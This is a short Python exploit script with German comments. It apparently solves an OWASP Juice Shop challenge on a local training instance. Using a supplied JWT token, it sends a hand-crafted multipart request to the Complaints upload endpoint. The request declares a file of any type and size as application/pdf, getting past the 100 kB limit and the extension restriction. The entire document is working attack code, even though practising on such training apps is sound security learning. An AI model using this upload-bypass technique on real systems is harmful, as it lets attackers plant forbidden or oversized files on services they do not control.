#!/usr/bin/env python3
"""
Juice Shop Upload Exploit Script
--------------------------------
Dieses Skript lädt eine Datei über 100 kB mit einer verbotenen Dateiendung
(z. B. .zip oder .jpg) hoch, indem es die MIME- und Grenzprüfungen umgeht.

⚙️ Verwendung:
    python3 upload_exploit.py <JWT_TOKEN> <FILE_PATH>

📌 Beispiel:
    python3 upload_exploit.py eyJhbGciOiJI... /Users/user/Downloads/boom.zip

✅ Dieses Skript umgeht:
    - die 100kB Upload-Grenze
    - die .pdf/.zip-Extension-Beschränkung
"""

import os
import sys

import requests

if len(sys.argv) != 3:
	print("❌ Falsche Nutzung.")
	print("▶️ Aufruf: python3 upload_exploit.py <JWT_TOKEN> <FILE_PATH>")
	sys.exit(1)

JWT_TOKEN = sys.argv[1]
FILE_PATH = sys.argv[2]
URL = "http://localhost:3000/api/Complaints"

# 🔍 Existenz der Datei prüfen
if not os.path.isfile(FILE_PATH):
	print(f"❌ Datei nicht gefunden: {FILE_PATH}")
	sys.exit(1)

# 📄 Dateiinhalt lesen
with open(FILE_PATH, "rb") as f:
	file_content = f.read()

if len(file_content) <= 102400:
	print(f"⚠️ Warnung: Datei ist nicht größer als 100 kB ({len(file_content)} Bytes)")
else:
	print(f"📦 Datei geladen ({len(file_content)} Bytes)")

# 🧱 Multipart-Boundary
boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"

# 📦 Manuell formatiertes multipart/form-data-Body
multipart_data = (
	                 f"--{boundary}\r\n"
	                 f"Content-Disposition: form-data; name=\"message\"\r\n\r\n"
	                 f"This is an oversized test\r\n"
	                 f"--{boundary}\r\n"
	                 f"Content-Disposition: form-data; name=\"file\"; filename=\"{os.path.basename(FILE_PATH)}\"\r\n"
	                 f"Content-Type: application/pdf\r\n\r\n"
                 ).encode("utf-8") + file_content + f"\r\n--{boundary}--\r\n".encode("utf-8")

# 📬 HTTP-Header
headers = {
	"Authorization": f"Bearer {JWT_TOKEN}",
	"Content-Type": f"multipart/form-data; boundary={boundary}"
}

# 📤 POST senden
response = requests.post(URL, headers=headers, data=multipart_data)

# 🧾 Ausgabe
print(f"\nStatus Code: {response.status_code}")
if response.status_code == 201:
	print("✅ Erfolgreich hochgeladen. Challenge vermutlich gelöst!")
else:
	print("❌ Fehler beim Upload.")
	print(response.text)
